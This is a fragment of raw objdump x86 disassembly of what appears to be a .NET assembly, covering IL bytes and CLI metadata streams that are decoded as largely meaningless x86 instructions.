  4025ce:	00 0a                	add    %cl,(%edx)
  4025d0:	0d 72 65 01 00       	or     $0x16572,%eax
  4025d5:	70 09                	jo     0x4025e0
  4025d7:	72 db                	jb     0x4025b4
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	70 72                	jo     0x40264f
  4025dd:	7f 01                	jg     0x4025e0
  4025df:	00 70 6f             	add    %dh,0x6f(%eax)
  4025e2:	3a 00                	cmp    (%eax),%al
  4025e4:	00 0a                	add    %cl,(%edx)
  4025e6:	72 85                	jb     0x40256d
  4025e8:	01 00                	add    %eax,(%eax)
  4025ea:	70 28                	jo     0x402614
  4025ec:	25 00 00 0a 13       	and    $0x130a0000,%eax
  4025f1:	04 02                	add    $0x2,%al
  4025f3:	73 3b                	jae    0x402630
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 7d 12             	or     0x12(%ebp),%bh
  4025fa:	00 00                	add    %al,(%eax)
  4025fc:	04 02                	add    $0x2,%al
  4025fe:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402601:	3c 00                	cmp    $0x0,%al
  402603:	00 0a                	add    %cl,(%edx)
  402605:	72 8b                	jb     0x402592
  402607:	01 00                	add    %eax,(%eax)
  402609:	70 73                	jo     0x40267e
  40260b:	3d 00 00 0a 7d       	cmp    $0x7d0a0000,%eax
  402610:	13 00                	adc    (%eax),%eax
  402612:	00 04 02             	add    %al,(%edx,%eax,1)
  402615:	7b 12                	jnp    0x402629
  402617:	00 00                	add    %al,(%eax)
  402619:	04 02                	add    $0x2,%al
  40261b:	7b 11                	jnp    0x40262e
  40261d:	00 00                	add    %al,(%eax)
  40261f:	04 02                	add    $0x2,%al
  402621:	7b 13                	jnp    0x402636
  402623:	00 00                	add    %al,(%eax)
  402625:	04 6f                	add    $0x6f,%al
  402627:	3e 00 00             	add    %al,%ds:(%eax)
  40262a:	0a 6f 3f             	or     0x3f(%edi),%ch
  40262d:	00 00                	add    %al,(%eax)
  40262f:	0a 13                	or     (%ebx),%dl
  402631:	08 12                	or     %dl,(%edx)
  402633:	08 28                	or     %ch,(%eax)
  402635:	40                   	inc    %eax
  402636:	00 00                	add    %al,(%eax)
  402638:	0a 2d 3e 02 16 25    	or     0x2516023e,%ch
  40263e:	0a 7d 0f             	or     0xf(%ebp),%bh
  402641:	00 00                	add    %al,(%eax)
  402643:	04 02                	add    $0x2,%al
  402645:	11 08                	adc    %ecx,(%eax)
  402647:	7d 14                	jge    0x40265d
  402649:	00 00                	add    %al,(%eax)
  40264b:	04 02                	add    $0x2,%al
  40264d:	7c 10                	jl     0x40265f
  40264f:	00 00                	add    %al,(%eax)
  402651:	04 12                	add    $0x12,%al
  402653:	08 02                	or     %al,(%edx)
  402655:	28 07                	sub    %al,(%edi)
  402657:	00 00                	add    %al,(%eax)
  402659:	2b de                	sub    %esi,%ebx
  40265b:	7c 02                	jl     0x40265f
  40265d:	7b 14                	jnp    0x402673
  40265f:	00 00                	add    %al,(%eax)
  402661:	04 13                	add    $0x13,%al
  402663:	08 02                	or     %al,(%edx)
  402665:	7c 14                	jl     0x40267b
  402667:	00 00                	add    %al,(%eax)
  402669:	04 fe                	add    $0xfe,%al
  40266b:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  402670:	02 15 25 0a 7d 0f    	add    0xf7d0a25,%dl
  402676:	00 00                	add    %al,(%eax)
  402678:	04 12                	add    $0x12,%al
  40267a:	08 28                	or     %ch,(%eax)
  40267c:	41                   	inc    %ecx
  40267d:	00 00                	add    %al,(%eax)
  40267f:	0a 26                	or     (%esi),%ah
  402681:	02 7b 12             	add    0x12(%ebx),%bh
  402684:	00 00                	add    %al,(%eax)
  402686:	04 6f                	add    $0x6f,%al
  402688:	42                   	inc    %edx
  402689:	00 00                	add    %al,(%eax)
  40268b:	0a 02                	or     (%edx),%al
  40268d:	7b 13                	jnp    0x4026a2
  40268f:	00 00                	add    %al,(%eax)
  402691:	04 6f                	add    $0x6f,%al
  402693:	43                   	inc    %ebx
  402694:	00 00                	add    %al,(%eax)
  402696:	0a 02                	or     (%edx),%al
  402698:	14 7d                	adc    $0x7d,%al
  40269a:	12 00                	adc    (%eax),%al
  40269c:	00 04 02             	add    %al,(%edx,%eax,1)
  40269f:	14 7d                	adc    $0x7d,%al
  4026a1:	13 00                	adc    (%eax),%eax
  4026a3:	00 04 de             	add    %al,(%esi,%ebx,8)
  4026a6:	03 26                	add    (%esi),%esp
  4026a8:	de 00                	fiadds (%eax)
  4026aa:	de 19                	ficomps (%ecx)
  4026ac:	13 09                	adc    (%ecx),%ecx
  4026ae:	02 1f                	add    (%edi),%bl
  4026b0:	fe                   	(bad)
  4026b1:	7d 0f                	jge    0x4026c2
  4026b3:	00 00                	add    %al,(%eax)
  4026b5:	04 02                	add    $0x2,%al
  4026b7:	7c 10                	jl     0x4026c9
  4026b9:	00 00                	add    %al,(%eax)
  4026bb:	04 11                	add    $0x11,%al
  4026bd:	09 28                	or     %ebp,(%eax)
  4026bf:	31 00                	xor    %eax,(%eax)
  4026c1:	00 0a                	add    %cl,(%edx)
  4026c3:	de 13                	ficoms (%ebx)
  4026c5:	02 1f                	add    (%edi),%bl
  4026c7:	fe                   	(bad)
  4026c8:	7d 0f                	jge    0x4026d9
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	04 02                	add    $0x2,%al
  4026ce:	7c 10                	jl     0x4026e0
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	04 28                	add    $0x28,%al
  4026d4:	32 00                	xor    (%eax),%al
  4026d6:	00 0a                	add    %cl,(%edx)
  4026d8:	2a 00                	sub    (%eax),%al
  4026da:	00 00                	add    %al,(%eax)
  4026dc:	41                   	inc    %ecx
  4026dd:	4c                   	dec    %esp
  4026de:	00 00                	add    %al,(%eax)
  4026e0:	02 00                	add    (%eax),%al
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	1a 00                	sbb    (%eax),%al
  4026e6:	00 00                	add    %al,(%eax)
  4026e8:	1d 00 00 00 37       	sbb    $0x37000000,%eax
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	00 10                	add    %dl,(%eax)
	...
  4026f9:	00 00                	add    %al,(%eax)
  4026fb:	00 0a                	add    %cl,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	00 39                	add    %bh,(%ecx)
  402701:	01 00                	add    %eax,(%eax)
  402703:	00 43 01             	add    %al,0x1(%ebx)
  402706:	00 00                	add    %al,(%eax)
  402708:	03 00                	add    (%eax),%eax
  40270a:	00 00                	add    %al,(%eax)
  40270c:	10 00                	adc    %al,(%eax)
  40270e:	00 01                	add    %al,(%ecx)
  402710:	00 00                	add    %al,(%eax)
  402712:	00 00                	add    %al,(%eax)
  402714:	07                   	pop    %es
  402715:	00 00                	add    %al,(%eax)
  402717:	00 41 01             	add    %al,0x1(%ecx)
  40271a:	00 00                	add    %al,(%eax)
  40271c:	48                   	dec    %eax
  40271d:	01 00                	add    %eax,(%eax)
  40271f:	00 19                	add    %bl,(%ecx)
  402721:	00 00                	add    %al,(%eax)
  402723:	00 1a                	add    %bl,(%edx)
  402725:	00 00                	add    %al,(%eax)
  402727:	01 36                	add    %esi,(%esi)
  402729:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  40272d:	00 04 03             	add    %al,(%ebx,%eax,1)
  402730:	28 33                	sub    %dh,(%ebx)
  402732:	00 00                	add    %al,(%eax)
  402734:	0a 2a                	or     (%edx),%ch
  402736:	00 00                	add    %al,(%eax)
  402738:	42                   	inc    %edx
  402739:	53                   	push   %ebx
  40273a:	4a                   	dec    %edx
  40273b:	42                   	inc    %edx
  40273c:	01 00                	add    %eax,(%eax)
  40273e:	01 00                	add    %eax,(%eax)
  402740:	00 00                	add    %al,(%eax)
  402742:	00 00                	add    %al,(%eax)
  402744:	0c 00                	or     $0x0,%al
  402746:	00 00                	add    %al,(%eax)
  402748:	76 34                	jbe    0x40277e
  40274a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40274d:	33 30                	xor    (%eax),%esi
  40274f:	33 31                	xor    (%ecx),%esi
  402751:	39 00                	cmp    %eax,(%eax)
  402753:	00 00                	add    %al,(%eax)
  402755:	00 05 00 6c 00 00    	add    %al,0x6c00
  40275b:	00 d0                	add    %dl,%al
  40275d:	07                   	pop    %es
  40275e:	00 00                	add    %al,(%eax)
  402760:	23 7e 00             	and    0x0(%esi),%edi
  402763:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  402766:	00 00                	add    %al,(%eax)
  402768:	70 09                	jo     0x402773
  40276a:	00 00                	add    %al,(%eax)
  40276c:	23 53 74             	and    0x74(%ebx),%edx
  40276f:	72 69                	jb     0x4027da
  402771:	6e                   	outsb  %ds:(%esi),(%dx)
  402772:	67 73 00             	addr16 jae 0x402775
  402775:	00 00                	add    %al,(%eax)
  402777:	00 ac 11 00 00 b0 01 	add    %ch,0x1b00000(%ecx,%edx,1)
  40277e:	00 00                	add    %al,(%eax)
  402780:	23 55 53             	and    0x53(%ebp),%edx
  402783:	00 5c 13 00          	add    %bl,0x0(%ebx,%edx,1)
  402787:	00 10                	add    %dl,(%eax)
  402789:	00 00                	add    %al,(%eax)
  40278b:	00 23                	add    %ah,(%ebx)
  40278d:	47                   	inc    %edi
  40278e:	55                   	push   %ebp
  40278f:	49                   	dec    %ecx
  402790:	44                   	inc    %esp
  402791:	00 00                	add    %al,(%eax)
  402793:	00 6c 13 00          	add    %ch,0x0(%ebx,%edx,1)
  402797:	00 90 03 00 00 23    	add    %dl,0x23000003(%eax)
  40279d:	42                   	inc    %edx
  40279e:	6c                   	insb   (%dx),%es:(%edi)
  40279f:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a0:	62 00                	bound  %eax,(%eax)
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	00 00                	add    %al,(%eax)
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	02 00                	add    (%eax),%al
  4027aa:	00 01                	add    %al,(%ecx)
  4027ac:	57                   	push   %edi
  4027ad:	9f                   	lahf
  4027ae:	02 3e                	add    (%esi),%bh
  4027b0:	09 0a                	or     %ecx,(%edx)
  4027b2:	00 00                	add    %al,(%eax)
  4027b4:	00 fa                	add    %bh,%dl
  4027b6:	01 33                	add    %esi,(%ebx)
  4027b8:	00 16                	add    %dl,(%esi)
  4027ba:	00 00                	add    %al,(%eax)
  4027bc:	01 00                	add    %eax,(%eax)
  4027be:	00 00                	add    %al,(%eax)
  4027c0:	35 00 00 00 0b       	xor    $0xb000000,%eax
  4027c5:	00 00                	add    %al,(%eax)
  4027c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	15 00 00 00 1d       	adc    $0x1d000000,%eax
  4027d1:	00 00                	add    %al,(%eax)
  4027d3:	00 03                	add    %al,(%ebx)
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	00 43 00             	add    %al,0x0(%ebx)
  4027da:	00 00                	add    %al,(%eax)
  4027dc:	04 00                	add    $0x0,%al
  4027de:	00 00                	add    %al,(%eax)
  4027e0:	18 00                	sbb    %al,(%eax)
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	01 00                	add    %eax,(%eax)
  4027e6:	00 00                	add    %al,(%eax)
  4027e8:	0a 00                	or     (%eax),%al
  4027ea:	00 00                	add    %al,(%eax)
  4027ec:	06                   	push   %es
  4027ed:	00 00                	add    %al,(%eax)
  4027ef:	00 02                	add    %al,(%edx)
  4027f1:	00 00                	add    %al,(%eax)
  4027f3:	00 02                	add    %al,(%edx)
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	00 04 00             	add    %al,(%eax,%eax,1)
  4027fa:	00 00                	add    %al,(%eax)
  4027fc:	01 00                	add    %eax,(%eax)
  4027fe:	00 00                	add    %al,(%eax)
  402800:	01 00                	add    %eax,(%eax)
  402802:	00 00                	add    %al,(%eax)
  402804:	03 00                	add    (%eax),%eax
  402806:	00 00                	add    %al,(%eax)
  402808:	04 00                	add    $0x0,%al
  40280a:	00 00                	add    %al,(%eax)
  40280c:	07                   	pop    %es
  40280d:	00 00                	add    %al,(%eax)
  40280f:	00 00                	add    %al,(%eax)
  402811:	00 8a 05 01 00 00    	add    %cl,0x105(%edx)
  402817:	00 00                	add    %al,(%eax)
  402819:	00 06                	add    %al,(%esi)
  40281b:	00 dd                	add    %bl,%ch
  40281d:	04 c4                	add    $0xc4,%al
  40281f:	07                   	pop    %es
  402820:	06                   	push   %es
  402821:	00 4a 05             	add    %cl,0x5(%edx)
  402824:	c4 07                	les    (%edi),%eax
  402826:	06                   	push   %es
  402827:	00 de                	add    %bl,%dh
  402829:	03 92 07 0f 00 e4    	add    -0x1bfff0f9(%edx),%edx
  40282f:	07                   	pop    %es
  402830:	00 00                	add    %al,(%eax)
  402832:	06                   	push   %es
  402833:	00 06                	add    %al,(%esi)
  402835:	04 62                	add    $0x62,%al
  402837:	06                   	push   %es
  402838:	06                   	push   %es
  402839:	00 c0                	add    %al,%al
  40283b:	04 62                	add    $0x62,%al
  40283d:	06                   	push   %es
  40283e:	06                   	push   %es
  40283f:	00 a1 04 62 06 06    	add    %ah,0x6066204(%ecx)
  402845:	00 31                	add    %dh,(%ecx)
  402847:	05 62 06 06 00       	add    $0x60662,%eax
  40284c:	fd                   	std
  40284d:	04 62                	add    $0x62,%al
  40284f:	06                   	push   %es
  402850:	06                   	push   %es
  402851:	00 16                	add    %dl,(%esi)
  402853:	05 62 06 06 00       	add    $0x60662,%eax
  402858:	38 04 62             	cmp    %al,(%edx,%eiz,2)
  40285b:	06                   	push   %es
  40285c:	06                   	push   %es
  40285d:	00 f2                	add    %dh,%dl
  40285f:	03 a5 07 06 00 d0    	add    -0x2ffff9f9(%ebp),%esp
  402865:	03 a5 07 06 00 84    	add    -0x7bfff9f9(%ebp),%esp
  40286b:	04 62                	add    $0x62,%al
  40286d:	06                   	push   %es
  40286e:	06                   	push   %es
  40286f:	00 53 04             	add    %dl,0x4(%ebx)
  402872:	bc 05 06 00 bd       	mov    $0xbd000605,%esp
  402877:	08 2d 06 06 00 9c    	or     %ch,0x9c000606
  40287d:	02 f3                	add    %bl,%dh
  40287f:	07                   	pop    %es
  402880:	06                   	push   %es
  402881:	00 77 03             	add    %dh,0x3(%edi)
  402884:	2d 06 06 00 1d       	sub    $0x1d000606,%eax
  402889:	04 c4                	add    $0xc4,%al
  40288b:	07                   	pop    %es
  40288c:	06                   	push   %es
  40288d:	00 fe                	add    %bh,%dh
  40288f:	05 3e 08 06 00       	add    $0x6083e,%eax
  402894:	b5 03                	mov    $0x3,%ch
  402896:	c4 07                	les    (%edi),%eax
  402898:	06                   	push   %es
  402899:	00 72 03             	add    %dh,0x3(%edx)
  40289c:	2d 06 06 00 42       	sub    $0x42000606,%eax
  4028a1:	03 c4                	add    %esp,%eax
  4028a3:	07                   	pop    %es
  4028a4:	06                   	push   %es
  4028a5:	00 5b 09             	add    %bl,0x9(%ebx)
  4028a8:	b4 00                	mov    $0x0,%ah
  4028aa:	06                   	push   %es
  4028ab:	00 48 07             	add    %cl,0x7(%eax)
  4028ae:	c4 07                	les    (%edi),%eax
  4028b0:	06                   	push   %es
  4028b1:	00 a1 06 2d 06 06    	add    %ah,0x6062d06(%ecx)
  4028b7:	00 de                	add    %bl,%dh
  4028b9:	06                   	push   %es
  4028ba:	c4 07                	les    (%edi),%eax
  4028bc:	06                   	push   %es
  4028bd:	00 6c 04 92          	add    %ch,-0x6e(%esp,%eax,1)
  4028c1:	07                   	pop    %es
  4028c2:	06                   	push   %es
  4028c3:	00 34 06             	add    %dh,(%esi,%eax,1)
  4028c6:	2d 06 06 00 39       	sub    $0x39000606,%eax
  4028cb:	03 2d 06 06 00 a6    	add    0xa6000606,%ebp
  4028d1:	00 c4                	add    %al,%ah
  4028d3:	07                   	pop    %es
  4028d4:	0a 00                	or     (%eax),%al
  4028d6:	44                   	inc    %esp
  4028d7:	02 c1                	add    %cl,%al
  4028d9:	06                   	push   %es
  4028da:	0a 00                	or     (%eax),%al
  4028dc:	dd 08                	fisttpll (%eax)
  4028de:	c1 06 0a             	roll   $0xa,(%esi)
  4028e1:	00 e8                	add    %ch,%al
  4028e3:	08 c1                	or     %al,%cl
  4028e5:	06                   	push   %es
  4028e6:	06                   	push   %es
  4028e7:	00 8b 07 2d 06 06    	add    %cl,0x6062d07(%ebx)
  4028ed:	00 91 02 a5 07 06    	add    %dl,0x607a502(%ecx)
  4028f3:	00 72 02             	add    %dh,0x2(%edx)
  4028f6:	2d 06 06 00 7c       	sub    $0x7c000606,%eax
  4028fb:	05 2d 06 06 00       	add    $0x6062d,%eax
  402900:	55                   	push   %ebp
  402901:	08 c4                	or     %al,%ah
  402903:	07                   	pop    %es
  402904:	06                   	push   %es
  402905:	00 48 09             	add    %cl,0x9(%eax)
  402908:	2d 06 06 00 7e       	sub    $0x7e000606,%eax
  40290d:	02 2d 06 0e 00 9b    	add    0x9b000e06,%ch
  402913:	08 92 07 0e 00 e3    	or     %dl,-0x1cfff1f9(%edx)
  402919:	02 92 07 06 00 67    	add    0x67000607(%edx),%dl
  40291f:	09 b4 00 06 00 d8 05 	or     %esi,0x5d80006(%eax,%eax,1)
  402926:	2d 06 0e 00 ab       	sub    $0xab000e06,%eax
  40292b:	06                   	push   %es
  40292c:	92                   	xchg   %eax,%edx
  40292d:	07                   	pop    %es
  40292e:	0e                   	push   %cs
  40292f:	00 01                	add    %al,(%ecx)
  402931:	03 92 07 06 00 83    	add    -0x7cfff9f9(%edx),%edx
  402937:	07                   	pop    %es
  402938:	a2 05 06 00 c4       	mov    %al,0xc4000605
  40293d:	00 2d 06 06 00 b3    	add    %ch,0xb3000606
  402943:	05 11 09 06 00       	add    $0x60911,%eax
  402948:	9f                   	lahf
  402949:	00 3e                	add    %bh,(%esi)
  40294b:	08 0a                	or     %cl,(%edx)
  40294d:	00 f6                	add    %dh,%dh
  40294f:	08 c1                	or     %al,%cl
  402951:	06                   	push   %es
  402952:	0a 00                	or     (%eax),%al
  402954:	29 07                	sub    %eax,(%edi)
  402956:	c1 06 00             	roll   $0x0,(%esi)
  402959:	00 00                	add    %al,(%eax)
  40295b:	00 00                	add    %al,(%eax)
  40295d:	01 00                	add    %eax,(%eax)
  40295f:	00 00                	add    %al,(%eax)
  402961:	00 01                	add    %al,(%ecx)
  402963:	00 01                	add    %al,(%ecx)
  402965:	00 01                	add    %al,(%ecx)
  402967:	00 10                	add    %dl,(%eax)
  402969:	00 d1                	add    %dl,%cl
  40296b:	06                   	push   %es
  40296c:	00 00                	add    %al,(%eax)
  40296e:	41                   	inc    %ecx
  40296f:	00 01                	add    %al,(%ecx)
  402971:	00 01                	add    %al,(%ecx)
  402973:	00 81 01 10 00 77    	add    %al,0x77001001(%ecx)
  402979:	08 00                	or     %al,(%eax)
  40297b:	00 41 00             	add    %al,0x0(%ecx)
  40297e:	05 00 06 00 81       	add    $0x81000600,%eax
  402983:	01 10                	add    %edx,(%eax)
  402985:	00 0b                	add    %cl,(%ebx)
  402987:	07                   	pop    %es
  402988:	00 00                	add    %al,(%eax)
  40298a:	41                   	inc    %ecx
  40298b:	00 05 00 07 00 00    	add    %al,0x700
  402991:	00 10                	add    %dl,(%eax)
  402993:	00 25 06 1c 07 41    	add    %ah,0x41071c06
  402999:	00 05 00 0a 00 80    	add    %al,0x80000a00
  40299f:	01 10                	add    %edx,(%eax)
  4029a1:	00 13                	add    %dl,(%ebx)
  4029a3:	07                   	pop    %es
  4029a4:	3b 06                	cmp    (%esi),%eax
  4029a6:	41                   	inc    %ecx
  4029a7:	00 06                	add    %al,(%esi)
  4029a9:	00 0e                	add    %cl,(%esi)
  4029ab:	00 00                	add    %al,(%eax)
  4029ad:	01 00                	add    %eax,(%eax)
  4029af:	00 10                	add    %dl,(%eax)
  4029b1:	01 00                	add    %eax,(%eax)
  4029b3:	00 41 00             	add    %al,0x0(%ecx)
  4029b6:	07                   	pop    %es
  4029b7:	00 10                	add    %dl,(%eax)
  4029b9:	00 03                	add    %al,(%ebx)
  4029bb:	01 10                	add    %edx,(%eax)
  4029bd:	00 60 00             	add    %ah,0x0(%eax)
  4029c0:	00 00                	add    %al,(%eax)
  4029c2:	59                   	pop    %ecx
  4029c3:	00 08                	add    %cl,(%eax)
  4029c5:	00 10                	add    %dl,(%eax)
  4029c7:	00 03                	add    %al,(%ebx)
  4029c9:	01 10                	add    %edx,(%eax)
  4029cb:	00 8d 00 00 00 59    	add    %cl,0x59000000(%ebp)
  4029d1:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4029d4:	12 00                	adc    (%eax),%al
  4029d6:	03 01                	add    (%ecx),%eax
  4029d8:	10 00                	adc    %al,(%eax)
  4029da:	71 00                	jno    0x4029dc
  4029dc:	00 00                	add    %al,(%eax)
  4029de:	59                   	pop    %ecx
  4029df:	00 0f                	add    %cl,(%edi)
  4029e1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4029e4:	15 01 00 00 01       	adc    $0x1000001,%eax
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	00 59 00             	add    %bl,0x0(%ecx)
  4029ee:	15 00 16 00 51       	adc    $0x51001600,%eax
  4029f3:	80 44 01 af 01       	addb   $0x1,-0x51(%ecx,%eax,1)
  4029f8:	51                   	push   %ecx
  4029f9:	80 2f 01             	subb   $0x1,(%edi)
  4029fc:	af                   	scas   %es:(%edi),%eax
  4029fd:	01 51 80             	add    %edx,-0x80(%ecx)
  402a00:	52                   	push   %edx
  402a01:	01 af 01 51 80 63    	add    %ebp,0x63805101(%edi)
  402a07:	01 af 01 31 00 1a    	add    %ebp,0x1a003101(%edi)
  402a0d:	06                   	push   %es
  402a0e:	b2 01                	mov    $0x1,%dl
  402a10:	31 00                	xor    %eax,(%eax)
  402a12:	1b 02                	sbb    (%edx),%eax
  402a14:	b5 01                	mov    $0x1,%ch
  402a16:	33 01                	xor    (%ecx),%eax
  402a18:	1f                   	pop    %ds
  402a19:	00 b9 01 06 00 94    	add    %bh,-0x6bfff9ff(%ecx)
  402a1f:	03 bd 01 06 00 f5    	add    -0xafff9ff(%ebp),%edi
  402a25:	06                   	push   %es
  402a26:	c0 01 01             	rolb   $0x1,(%ecx)
  402a29:	00 ca                	add    %cl,%dl
  402a2b:	00 b2 01 01 00 98    	add    %dh,-0x67fffeff(%edx)
  402a31:	00 c4                	add    %al,%ah
  402a33:	01 06                	add    %eax,(%esi)
  402a35:	00 94 03 bd 01 06 00 	add    %dl,0x601bd(%ebx,%eax,1)
  402a3c:	f5                   	cmc
  402a3d:	06                   	push   %es
  402a3e:	c0 01 01             	rolb   $0x1,(%ecx)
  402a41:	00 98 00 c4 01 06    	add    %bl,0x601c400(%eax)
  402a47:	00 94 03 bd 01 06 00 	add    %dl,0x601bd(%ebx,%eax,1)
  402a4e:	f5                   	cmc
  402a4f:	06                   	push   %es
  402a50:	c0 01 06             	rolb   $0x6,(%ecx)
  402a53:	00 1a                	add    %bl,(%edx)
  402a55:	06                   	push   %es
  402a56:	b2 01                	mov    $0x1,%dl
  402a58:	01 00                	add    %eax,(%eax)
  402a5a:	d8 00                	fadds  (%eax)
  402a5c:	c8 01 01 00          	enter  $0x101,$0x0
  402a60:	e5 00                	in     $0x0,%eax
  402a62:	cd 01                	int    $0x1
  402a64:	01 00                	add    %eax,(%eax)
  402a66:	98                   	cwtl
  402a67:	00 d2                	add    %dl,%dl
  402a69:	01 00                	add    %eax,(%eax)
  402a6b:	00 00                	add    %al,(%eax)
  402a6d:	00 80 00 91 20 ab    	add    %al,-0x54df6f00(%eax)
  402a73:	02 db                	add    %bl,%bl
  402a75:	01 01                	add    %eax,(%ecx)
  402a77:	00 00                	add    %al,(%eax)
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	00 80 00 91 20 c4    	add    %al,-0x3bdf6f00(%eax)
  402a81:	02 e7                	add    %bh,%ah
  402a83:	01 08                	add    %ecx,(%eax)
  402a85:	00 50 20             	add    %dl,0x20(%eax)
  402a88:	00 00                	add    %al,(%eax)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	86 00                	xchg   %al,(%eax)
  402a8e:	7e 01                	jle    0x402a91
  402a90:	f3 01 0d 00 bc 20 00 	repz add %ecx,0x20bc00
  402a97:	00 00                	add    %al,(%eax)
  402a99:	00 86 00 71 01 f9    	add    %al,-0x6fe8f00(%esi)
  402a9f:	01 0e                	add    %ecx,(%esi)
  402aa1:	00 16                	add    %dl,(%esi)
  402aa3:	21 00                	and    %eax,(%eax)
  402aa5:	00 00                	add    %al,(%eax)
  402aa7:	00 86 18 76 07 06    	add    %al,0x6077618(%esi)
  402aad:	00 0e                	add    %cl,(%esi)
  402aaf:	00 20                	add    %ah,(%eax)
  402ab1:	21 00                	and    %eax,(%eax)
  402ab3:	00 00                	add    %al,(%eax)
  402ab5:	00 96 00 ae 01 fe    	add    %dl,-0x1fe5200(%esi)
  402abb:	01 0e                	add    %ecx,(%esi)
  402abd:	00 00                	add    %al,(%eax)
  402abf:	00 00                	add    %al,(%eax)
  402ac1:	00 80 00 91 20 65    	add    %al,0x65209100(%eax)
  402ac7:	07                   	pop    %es
  402ac8:	03 02                	add    (%edx),%eax
  402aca:	0e                   	push   %cs
  402acb:	00 00                	add    %al,(%eax)
  402acd:	00 00                	add    %al,(%eax)
  402acf:	00 80 00 91 20 58    	add    %al,0x58209100(%eax)
  402ad5:	02 0e                	add    (%esi),%cl
  402ad7:	02 14 00             	add    (%eax,%eax,1),%dl
  402ada:	5c                   	pop    %esp
  402adb:	21 00                	and    %eax,(%eax)
  402add:	00 00                	add    %al,(%eax)
  402adf:	00 96 00 3f 01 17    	add    %dl,0x17013f00(%esi)
  402ae5:	02 18                	add    (%eax),%bl
  402ae7:	00 a0 21 00 00 00    	add    %ah,0x21(%eax)
  402aed:	00 91 00 5d 06 1b    	add    %dl,0x1b065d00(%ecx)
  402af3:	02 18                	add    (%eax),%bl
  402af5:	00 db                	add    %bl,%bl
  402af7:	21 00                	and    %eax,(%eax)
  402af9:	00 00                	add    %al,(%eax)
  402afb:	00 86 18 76 07 06    	add    %al,0x6077618(%esi)
  402b01:	00 19                	add    %bl,(%ecx)
  402b03:	00 e3                	add    %ah,%bl
  402b05:	21 00                	and    %eax,(%eax)
  402b07:	00 00                	add    %al,(%eax)
  402b09:	00 91 18 7c 07 17    	add    %dl,0x17077c18(%ecx)
  402b0f:	02 19                	add    (%ecx),%bl
  402b11:	00 f0                	add    %dh,%al
  402b13:	21 00                	and    %eax,(%eax)
  402b15:	00 00                	add    %al,(%eax)
  402b17:	00 91 08 09 01 22    	add    %dl,0x22010908(%ecx)
  402b1d:	02 19                	add    (%ecx),%bl
  402b1f:	00 10                	add    %dl,(%eax)
  402b21:	22 00                	and    (%eax),%al
  402b23:	00 00                	add    %al,(%eax)
  402b25:	00 96 00 98 01 28    	add    %dl,0x28019800(%esi)
  402b2b:	02 1a                	add    (%edx),%bl
  402b2d:	00 53 22             	add    %dl,0x22(%ebx)
  402b30:	00 00                	add    %al,(%eax)
  402b32:	00 00                	add    %al,(%eax)
  402b34:	91                   	xchg   %eax,%ecx
  402b35:	18 7c 07 17          	sbb    %bh,0x17(%edi,%eax,1)
  402b39:	02 1b                	add    (%ebx),%bl
  402b3b:	00 60 22             	add    %ah,0x22(%eax)
  402b3e:	00 00                	add    %al,(%eax)
  402b40:	00 00                	add    %al,(%eax)
  402b42:	e1 01                	loope  0x402b45
  402b44:	08 09                	or     %cl,(%ecx)
  402b46:	06                   	push   %es
  402b47:	00 1b                	add    %bl,(%ebx)
  402b49:	00 04 24             	add    %al,(%esp)
  402b4c:	00 00                	add    %al,(%eax)
  402b4e:	00 00                	add    %al,(%eax)
  402b50:	e1 01                	loope  0x402b53
  402b52:	55                   	push   %ebp
  402b53:	03 20                	add    (%eax),%esp
  402b55:	00 1b                	add    %bl,(%ebx)
  402b57:	00 14 24             	add    %dl,(%esp)
  402b5a:	00 00                	add    %al,(%eax)
  402b5c:	00 00                	add    %al,(%eax)
  402b5e:	e1 01                	loope  0x402b61
  402b60:	08 09                	or     %cl,(%ecx)
  402b62:	06                   	push   %es
  402b63:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402b66:	48                   	dec    %eax
  402b67:	25 00 00 00 00       	and    $0x0,%eax
  402b6c:	e1 01                	loope  0x402b6f
  402b6e:	55                   	push   %ebp
  402b6f:	03 20                	add    (%eax),%esp
  402b71:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402b74:	58                   	pop    %eax
  402b75:	25 00 00 00 00       	and    $0x0,%eax
  402b7a:	e1 01                	loope  0x402b7d
  402b7c:	08 09                	or     %cl,(%ecx)
  402b7e:	06                   	push   %es
  402b7f:	00 1d 00 28 27 00    	add    %bl,0x272800
  402b85:	00 00                	add    %al,(%eax)
  402b87:	00 e1                	add    %ah,%cl
  402b89:	01 55 03             	add    %edx,0x3(%ebp)
  402b8c:	20 00                	and    %al,(%eax)
  402b8e:	1d 00 00 00 01       	sbb    $0x1000000,%eax
  402b93:	00 2e                	add    %ch,(%esi)
  402b95:	03 00                	add    (%eax),%eax
  402b97:	00 02                	add    %al,(%edx)
  402b99:	00 81 08 00 00 03    	add    %al,0x3000008(%ecx)
  402b9f:	00 27                	add    %ah,(%edi)
  402ba1:	02 00                	add    (%eax),%al
  402ba3:	00 04 00             	add    %al,(%eax,%eax,1)
  402ba6:	24 08                	and    $0x8,%al
  402ba8:	00 00                	add    %al,(%eax)
  402baa:	05 00 74 06 00       	add    $0x67400,%eax
  402baf:	00 06                	add    %al,(%esi)
  402bb1:	00 0f                	add    %cl,(%edi)
  402bb3:	08 00                	or     %al,(%eax)
  402bb5:	00 07                	add    %al,(%edi)
